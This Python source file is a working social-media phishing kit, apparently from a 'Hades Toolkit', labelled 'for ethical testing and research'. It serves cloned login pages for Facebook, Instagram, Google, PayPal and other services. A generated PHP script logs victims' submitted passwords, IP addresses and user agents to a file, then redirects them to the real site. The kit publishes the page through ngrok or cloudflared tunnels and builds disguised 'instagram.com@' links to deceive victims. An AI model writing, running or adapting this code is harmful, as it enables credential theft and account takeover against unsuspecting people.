"""
social_media_hacking.py

A modular social media phishing link generator and credential capture tool for ethical testing and research.
"""

import os
import time
import requests
import random
import string
import subprocess
from urllib.parse import quote
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from pyngrok import ngrok, conf

from utils.ui import console, clear_screen, print_banner

# --- Template loader for modular HTML templates ---
def load_and_patch_template(template_type, capture_url):
    """Load HTML template from /templates/[template_type]/login.html and patch form action."""
    import re
    template_path = os.path.join(os.path.dirname(__file__), '..', 'templates', template_type, 'login.html')
    if not os.path.exists(template_path):
        return f"<h2>Template not found: {template_type}</h2>"
    with open(template_path, 'r', encoding='utf-8') as f:
        html = f.read()
    # Replace the form action with the capture_url
    html = re.sub(r'<form[^>]*action=["\'][^"\']*["\']', f'<form action="{capture_url}"', html, flags=re.IGNORECASE)
    return html

# Entrypoint for main.py integration
def social_media_hacking():
    main_menu()

# --- Zphisher-style Main Menu and Submenus ---
def main_menu():
    clear_screen()
    print_banner("Hades Toolkit - Social Media Phishing")
    menu_text = """
[bold cyan]Select a platform to phish:[/bold cyan]
1. Facebook
2. Instagram
3. Google
4. Netflix
5. PayPal
6. Amazon
7. Twitter/X
8. Snapchat
9. LinkedIn
10. Github
11. Discord
12. Yahoo
13. Microsoft
14. Steam
15. Spotify
16. Pinterest
17. Reddit
18. Twitch
19. Dropbox
20. Custom
0. Exit
"""
    menu = Panel(menu_text, border_style="magenta")
    console.print(menu)
    console.print("[bold magenta]Instagram: Prathi_hades[/bold magenta]")
    choices = [str(i) for i in range(21)]
    choice = Prompt.ask("[yellow]Select option[/yellow]", choices=choices, default="1")
    if choice == "0":
        console.print("[green]Exiting...[/green]")
        return
    platform_map = {
        "1": ("Facebook", facebook_menu),
        "2": ("Instagram", instagram_menu),
        "3": ("Google", google_menu),
        "4": ("Netflix", simple_menu),
        "5": ("PayPal", simple_menu),
        "6": ("Amazon", simple_menu),
        "7": ("Twitter", simple_menu),
        "8": ("Snapchat", simple_menu),
        "9": ("LinkedIn", simple_menu),
        "10": ("Github", simple_menu),
        "11": ("Discord", simple_menu),
        "12": ("Yahoo", simple_menu),
        "13": ("Microsoft", simple_menu),
        "14": ("Steam", simple_menu),
        "15": ("Spotify", simple_menu),
        "16": ("Pinterest", simple_menu),
        "17": ("Reddit", simple_menu),
        "18": ("Twitch", simple_menu),
        "19": ("Dropbox", simple_menu),
        "20": ("Custom", custom_menu),
    }
    platform, submenu = platform_map.get(choice, ("Facebook", facebook_menu))
    submenu(platform)

def facebook_menu(platform_name):
    clear_screen()
    print_banner(f"{platform_name} Phishing")
    options = [
        "Traditional Login Page",
        "Advanced Voting Poll Login Page",
        "Fake Security Login Page",
        "Facebook Messenger Login Page",
        "Back to Main Menu"
    ]
    table = Table(title=f"[bold cyan]{platform_name} Templates[/bold cyan]", border_style="blue")
    for idx, opt in enumerate(options, 1):
        table.add_row(str(idx), opt)
    console.print(table)
    choice = Prompt.ask("[yellow]Select template[/yellow]", choices=[str(i) for i in range(1, len(options)+1)], default="1")
    if choice == str(len(options)):
        main_menu()
        return
    template_types = ["facebook", "fb_advanced", "fb_security", "fb_messenger"]
    template = template_types[int(choice)-1]
    run_phishing_workflow(platform_name, template)

def instagram_menu(platform_name):
    clear_screen()
    print_banner(f"{platform_name} Phishing")
    options = [
        "Traditional Login Page",
        "Auto Followers Login Page",
        "1000 Followers Login Page",
        "Blue Badge Verify Login Page",
        "Back to Main Menu"
    ]
    table = Table(title=f"[bold cyan]{platform_name} Templates[/bold cyan]", border_style="magenta")
    for idx, opt in enumerate(options, 1):
        table.add_row(str(idx), opt)
    console.print(table)
    choice = Prompt.ask("[yellow]Select template[/yellow]", choices=[str(i) for i in range(1, len(options)+1)], default="1")
    if choice == str(len(options)):
        main_menu()
        return
    template_types = ["instagram", "ig_followers", "insta_followers", "ig_verify"]
    template = template_types[int(choice)-1]
    run_phishing_workflow(platform_name, template)

def google_menu(platform_name):
    clear_screen()
    print_banner(f"{platform_name} Phishing")
    options = [
        "Gmail Old Login Page",
        "Gmail New Login Page",
        "Advanced Voting Poll",
        "Back to Main Menu"
    ]
    table = Table(title=f"[bold cyan]{platform_name} Templates[/bold cyan]", border_style="yellow")
    for idx, opt in enumerate(options, 1):
        table.add_row(str(idx), opt)
    console.print(table)
    choice = Prompt.ask("[yellow]Select template[/yellow]", choices=[str(i) for i in range(1, len(options)+1)], default="1")
    if choice == str(len(options)):
        main_menu()
        return
    template_types = ["google", "google_new", "google_poll"]
    template = template_types[int(choice)-1]
    run_phishing_workflow(platform_name, template)

def simple_menu(platform_name):
    clear_screen()
    print_banner(f"{platform_name} Phishing")
    run_phishing_workflow(platform_name, platform_name.lower())

def custom_menu(platform_name):
    clear_screen()
    print_banner("Custom Phishing")
    template = Prompt.ask("[cyan]Enter custom template type (e.g., facebook)[/cyan]", default="facebook")
    run_phishing_workflow(platform_name, template)

# --- Main workflow wrapper for Zphisher-style menus ---
def run_phishing_workflow(platform, template):
    clear_screen()
    print_banner(f"{platform} Phishing - {template.title()} Template")
    real_url = Prompt.ask("[cyan]Enter the real URL to redirect after capture[/cyan]", default="https://google.com")
    filename = f"{template}_login.html"
    capture_php = create_capture_server(real_url, filename)
    capture_filename = "capture.php"
    with open(capture_filename, 'w') as f:
        f.write(str(capture_php))
    capture_url = f"capture.php"
    html_content = load_and_patch_template(template, capture_url)
    with open(filename, 'w') as f:
        f.write(str(html_content))
    console.print(f"[green]✅ Template saved as: {filename}[/green]")
    console.print(f"[green]✅ Capture server saved as: {capture_filename}[/green]")
    # Tunnel selection menu
    console.print("\n[bold cyan]Select tunnel method:[/bold cyan]")
    console.print("[cyan][01][/cyan] Localhost")
    console.print("[cyan][02][/cyan] Ngrok [Online, Shareable]")
    console.print("[cyan][03][/cyan] Cloudflared [Auto Detects]")
    console.print("[cyan][04][/cyan] LocalXpose [NEW! Max 15Min]")
    tunnel_choice = Prompt.ask("[yellow]Choose tunnel method[/yellow]", choices=["1","2","3","4"], default="1")
    tunnel_url = None
    server_process = None
    tunnel_process = None
    port = 8000
    if tunnel_choice == "1":
        server_process, port = start_local_server()
        if server_process:
            tunnel_url = f"http://localhost:{port}/{filename}"
            console.print(f"[green]✅ Local server started on: {tunnel_url}[/green]")
    elif tunnel_choice == "2":
        if not check_ngrok():
            console.print("[red]❌ Ngrok not installed. Install from: https://ngrok.com/download[/red]")
        else:
            if setup_ngrok_auth(auto_setup=True):
                server_process, port = start_local_server()
                if server_process:
                    public_url = start_ngrok_tunnel(port)
                    if public_url:
                        tunnel_url = f"{public_url}/{filename}"
                        console.print(f"[green]✅ Ngrok tunnel active: {tunnel_url}[/green]")
                    else:
                        console.print("[red]❌ Failed to start ngrok tunnel. Cannot proceed with ngrok.")
                else:
                    console.print("[red]❌ Failed to start local server[/red]")
            else:
                console.print("[bold red]❌ Ngrok authentication failed! Cannot proceed with ngrok tunnel.[/bold red]")
    elif tunnel_choice == "3":
        if not check_cloudflared():
            console.print("[red]❌ Cloudflared not installed. Install from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/tunnel-guide/[/red]")
        else:
            server_process, port = start_local_server()
            if server_process:
                tunnel_process = start_cloudflare_tunnel(port)
                if tunnel_process:
                    tunnel_url = f"http://localhost:{port}/{filename}"
                    console.print(f"[green]✅ Cloudflared tunnel active (check cloudflared output)[/green]")
                    console.print(f"[cyan]Local access: {tunnel_url}[/cyan]")
    elif tunnel_choice == "4":
        console.print("[yellow]LocalXpose integration not implemented yet. Please use Ngrok or Cloudflared for now.[/yellow]")
    if not tunnel_url:
        console.print("[red]❌ Could not start the selected tunnel/server. Exiting workflow.[/red]")
        return
    
    # Generate masked URL
    masked_url, real_tunnel_url = get_masked_url(platform, tunnel_url)
    
    console.print(f"\n[bold cyan]🎯 Phishing URLs Generated:[/bold cyan]")
    console.print(f"[green]✅ Real Tunnel: {real_tunnel_url}[/green]")
    console.print(f"[yellow]🎭 Masked URL: {masked_url}[/yellow]")
    console.print(f"[cyan]💡 This URL looks like Instagram but redirects to your phishing page![/cyan]")
    console.print(f"[green]🔗 Real Tunnel: {real_tunnel_url}[/green]")
    
    console.print(f"\n[bold cyan]Waiting for Login Info, Ctrl + C to exit...[/bold cyan]")
    shown_ips = set()
    shown_creds = set()
    last_event = None
    capture_count = 0
    
    # Show initial status
    status_table = Table(title="[bold green]🎯 Capture Status[/bold green]", border_style="green")
    status_table.add_column("Metric", style="cyan", no_wrap=True)
    status_table.add_column("Value", style="yellow")
    status_table.add_row("Total Captures", str(capture_count))
    status_table.add_row("Masked URL", f"[yellow]{masked_url}[/yellow]")
    status_table.add_row("Real Tunnel", f"[green]{real_tunnel_url}[/green]")
    status_table.add_row("Status", "[green]Active[/green]")
    console.print(status_table)
    console.print("")
    
    try:
        while True:
            time.sleep(2)
            if os.path.exists("credentials.txt"):
                with open("credentials.txt", "r") as f:
                    lines = [line for line in f if line.strip()]
                # Parse blocks
                blocks = []
                block = {}
                for line in lines:
                    if line.strip() == '---':
                        if block:
                            blocks.append(block)
                            block = {}
                    elif ':' in line:
                        k, v = line.split(':', 1)
                        block[k.strip().lower()] = v.strip()
                if block:
                    blocks.append(block)
                # Only show the latest event, no banner, no extra lines
                latest = None
                for c in reversed(blocks):
                    ip = c.get('ip', 'N/A')
                    account = c.get('email') or c.get('username') or c.get('login')
                    password = c.get('password')
                    # Credentials event
                    if account and password:
                        cred_key = f"{ip}|{account}|{password}"
                        if cred_key not in shown_creds:
                            latest = ('cred', ip, account, password)
                            shown_creds.add(cred_key)
                            capture_count += 1
                            if ip and ip not in shown_ips:
                                shown_ips.add(ip)
                            break
                    # IP event
                    elif ip and ip not in shown_ips and not account and not password:
                        latest = ('ip', ip)
                        shown_ips.add(ip)
                        capture_count += 1
                        break
                if latest and latest != last_event:
                    # Update status table
                    console.print(f"\r[bold green]📊 Total Captures: {capture_count}[/bold green]", end="")
                    
                    if latest[0] == 'ip':
                        formatted_ip = format_ip_address(latest[1])
                        console.print(f"\n[cyan]┌─ Victim IP Found ──────────────────────────────┐[/cyan]")
                        console.print(f"[yellow]│ IP Address: {formatted_ip}[/yellow]")
                        console.print(f"[yellow]│ Saved to: auth/ip.txt[/yellow]")
                        console.print(f"[cyan]└─────────────────────────────────────────────┘[/cyan]")
                    elif latest[0] == 'cred':
                        formatted_ip = format_ip_address(latest[1])
                        console.print(f"\n[green]┌─ Login Credentials Captured ──────────────────┐[/green]")
                        console.print(f"[yellow]│ Account: {latest[2]}[/yellow]")
                        console.print(f"[yellow]│ Password: {latest[3]}[/yellow]")
                        console.print(f"[yellow]│ Victim IP: {formatted_ip}[/yellow]")
                        console.print(f"[yellow]│ Saved to: auth/usernames.dat[/yellow]")
                        console.print(f"[green]└─────────────────────────────────────────────┘[/green]")
                    console.print("")
                    last_event = latest
    except KeyboardInterrupt:
        console.print(f"\n\n[bold red]┌─ Session Terminated ──────────────────────────┐[/bold red]")
        console.print(f"[yellow]│ Total Captures: {capture_count}[/yellow]")
        console.print(f"[yellow]│ Stopping server and tunnels...[/yellow]")
        console.print(f"[bold red]└─────────────────────────────────────────────┘[/bold red]")
        if server_process:
            server_process.terminate()
        if tunnel_process:
            tunnel_process.terminate()
        console.print(f"[green]✅ Server stopped successfully![/green]")
        main_menu()

# --- Helper functions ---

def get_masked_url(platform, tunnel_url):
    """Generate masked URL based on platform for better social engineering."""
    platform_masks = {
        "facebook": "https://facebook.com/login",
        "instagram": "https://instagram.com/accounts/login",
        "google": "https://accounts.google.com/signin",
        "netflix": "https://www.netflix.com/login",
        "paypal": "https://www.paypal.com/signin",
        "amazon": "https://www.amazon.com/ap/signin",
        "twitter": "https://twitter.com/login",
        "snapchat": "https://accounts.snapchat.com/accounts/login",
        "linkedin": "https://www.linkedin.com/login",
        "github": "https://github.com/login",
        "discord": "https://discord.com/login",
        "yahoo": "https://login.yahoo.com",
        "microsoft": "https://login.microsoft.com",
        "steam": "https://store.steampowered.com/login",
        "spotify": "https://accounts.spotify.com/login",
        "pinterest": "https://www.pinterest.com/login",
        "reddit": "https://www.reddit.com/login",
        "twitch": "https://www.twitch.tv/login",
        "dropbox": "https://www.dropbox.com/login"
    }

    # Get base masked URL for platform
    masked_base = platform_masks.get(platform.lower(), f"https://{platform.lower()}.com/login")

    # Create a working masked URL using URL shortening technique
    # This creates a URL that looks like the real site but redirects to our tunnel
    try:
        # Extract domain from tunnel URL
        from urllib.parse import urlparse
        parsed_tunnel = urlparse(tunnel_url)
        tunnel_domain = parsed_tunnel.netloc

        # Create masked URL using a redirect technique
        # Format: https://instagram.com@tunnel-domain/path
        # This tricks browsers into showing instagram.com but connecting to our tunnel
        masked_url = f"https://instagram.com@{tunnel_domain}{parsed_tunnel.path}"

        return masked_url, tunnel_url

    except Exception:
        # Fallback to simple masked URL if something goes wrong
        return masked_base, tunnel_url

def format_ip_address(ip):
    """Format IP address for better readability, preferring IPv4 when possible."""
    if not ip or ip == 'N/A':
        return 'N/A'
    
    # Convert IPv4-mapped IPv6 to IPv4 (::ffff:192.168.1.1 -> 192.168.1.1)
    if ip.startswith('::ffff:'):
        ipv4_part = ip[7:]  # Remove ::ffff: prefix
        if is_valid_ipv4(ipv4_part):
            return ipv4_part
    
    # If it's already IPv4, return as is
    if is_valid_ipv4(ip):
        return ip
    
    # For IPv6 addresses, show compressed format
    if ':' in ip:
        try:
            import ipaddress
            ipv6_obj = ipaddress.IPv6Address(ip)
            return ipv6_obj.compressed
        except Exception:
            return ip
    
    return ip

def is_valid_ipv4(ip):
    """Check if string is a valid IPv4 address."""
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            if not part.isdigit() or not 0 <= int(part) <= 255:
                return False
        return True
    except:
        return False

def create_capture_server(real_url, template_file="facebook_login.html"):
    """Create a PHP capture server that handles redirects and works on both localhost and ngrok."""
    capture_php = f'''<?php
function get_real_ip() {{
    // Debug: Log all relevant headers
    $debug_file = "ip_debug.txt";
    $headers = "Headers received:\\n";
    foreach($_SERVER as $key => $value) {{
        if (strpos($key, 'HTTP_') === 0 || strpos($key, 'REMOTE_') === 0) {{
            $headers .= "$key: $value\\n";
        }}
    }}
    $headers .= "\\n---\\n";
    file_put_contents($debug_file, $headers, FILE_APPEND);

    $ip = '';

    // Priority 1: Check for IPv4 in forwarded headers
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {{
        $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($forwarded_ips as $fwd_ip) {{
            $fwd_ip = trim($fwd_ip);
            if (filter_var($fwd_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE)) {{
                $ip = $fwd_ip;
                break;
            }} elseif (filter_var($fwd_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {{
                $ip = $fwd_ip; // Accept private IPv4 too
            }}
        }}
    }}

    // Priority 2: Check other IPv4 headers
    if (empty($ip)) {{
        $ipv4_headers = [
            'HTTP_X_REAL_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_X_ORIGINAL_FORWARDED_FOR'
        ];
        
        foreach ($ipv4_headers as $header) {{
            if (!empty($_SERVER[$header])) {{
                $header_ips = explode(',', $_SERVER[$header]);
                foreach ($header_ips as $hdr_ip) {{
                    $hdr_ip = trim($hdr_ip);
                    if (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE)) {{
                        $ip = $hdr_ip;
                        break 2;
                    }} elseif (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {{
                        $ip = $hdr_ip;
                        break 2;
                    }}
                }}
            }}
        }}
    }}

    // Priority 3: Check for IPv6 if no IPv4 found
    if (empty($ip)) {{
        $ipv6_headers = [
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED',
            'HTTP_X_ORIGINAL_FORWARDED_FOR'
        ];
        
        foreach ($ipv6_headers as $header) {{
            if (!empty($_SERVER[$header])) {{
                $header_ips = explode(',', $_SERVER[$header]);
                foreach ($header_ips as $hdr_ip) {{
                    $hdr_ip = trim($hdr_ip);
                    if (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {{
                        $ip = $hdr_ip;
                        break 2;
                    }}
                }}
            }}
        }}
    }}

    // Fallback to REMOTE_ADDR
    if (empty($ip)) {{
        $ip = $_SERVER['REMOTE_ADDR'];
    }}

    // Final validation
    if (filter_var($ip, FILTER_VALIDATE_IP)) {{
        return $ip;
    }} else {{
        return $_SERVER['REMOTE_ADDR'];
    }}
}}

if ($_SERVER["REQUEST_METHOD"] === "POST") {{
    $log_file = "credentials.txt";
    $data = "";
    foreach($_POST as $key => $value) {{
        $data .= "$key: $value\\n";
    }}
    $real_ip = get_real_ip();
    $data .= "IP: " . $real_ip . "\\n";
    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
    $data .= "---\\n\\n";
    file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);
    header("Location: {real_url}");
    exit();
}}
include('{template_file}');
?>'''
    return capture_php

def check_ngrok():
    try:
        subprocess.run(["ngrok", "version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def setup_ngrok_auth(auto_setup=False):
    # Dummy implementation for placeholder
    return True

def start_local_server():
    # Use PHP's built-in server so PHP files are executed
    try:
        process = subprocess.Popen(["php", "-S", "localhost:8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)  # Give the server a moment to start
        return process, 8000
    except Exception as e:
        console.print(f"[red]❌ Error starting PHP server: {e}[/red]")
        return None, None

def start_ngrok_tunnel(port):
    # Configure ngrok to forward real IP headers
    conf.get_default().request_timeout = 10
    conf.get_default().headers = {
        'X-Forwarded-For': '$remote_addr',
        'X-Real-IP': '$remote_addr'
    }
    try:
        tunnel = ngrok.connect(port, bind_tls=True)
        public_url = tunnel.public_url
        console.print(f"[green]✅ Ngrok tunnel configured with IP forwarding[/green]")
        return public_url
    except Exception as e:
        console.print(f"[red]❌ Ngrok tunnel error: {e}[/red]")
        return None

def check_cloudflared():
    try:
        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def start_cloudflare_tunnel(port):
    # Dummy implementation for placeholder
    return subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"])

def verify_phishing_files(filename, capture_filename):
    # Dummy implementation for placeholder
    pass

def create_phishing_template(template_type, real_url, capture_url):
    # Not used in this version, as templates are loaded from files
    return ""

def test_generated_link(link):
    try:
        response = requests.get(link, timeout=10, allow_redirects=True)
        if response.status_code == 200:
            if "login" in response.text.lower() or "password" in response.text.lower():
                return True
        return False
    except Exception:
        return False

def display_captured_credentials(file_path):
    try:
        with open(file_path, 'r') as f:
            lines = [line for line in f if line.strip()]
        creds = []
        block = {}
        for line in lines:
            if line.strip() == '---':
                if block:
                    creds.append(block)
                    block = {}
            elif ':' in line:
                k, v = line.split(':', 1)
                block[k.strip().lower()] = v.strip()
        if block:
            creds.append(block)
        if creds:
            table = Table(title="[bold cyan]All Captured Credentials[/bold cyan]", border_style="green")
            table.add_column("Email/Username", style="magenta")
            table.add_column("Password", style="yellow")
            table.add_column("IP", style="cyan")
            table.add_column("Time", style="green")
            for c in creds:
                email = c.get('email') or c.get('username') or 'N/A'
                password = c.get('password', 'N/A')
                ip = c.get('ip', 'N/A')
                time_val = c.get('time', 'N/A')
                table.add_row(email, password, ip, time_val)
            console.print(table)
            with open("all_captured_credentials.txt", "w") as outf:
                outf.write("Email/Username\tPassword\tIP\tTime\n")
                for c in creds:
                    email = c.get('email') or c.get('username') or 'N/A'
                    password = c.get('password', 'N/A')
                    ip = c.get('ip', 'N/A')
                    time_val = c.get('time', 'N/A')
                    outf.write(f"{email}\t{password}\t{ip}\t{time_val}\n")
    except Exception:
        pass
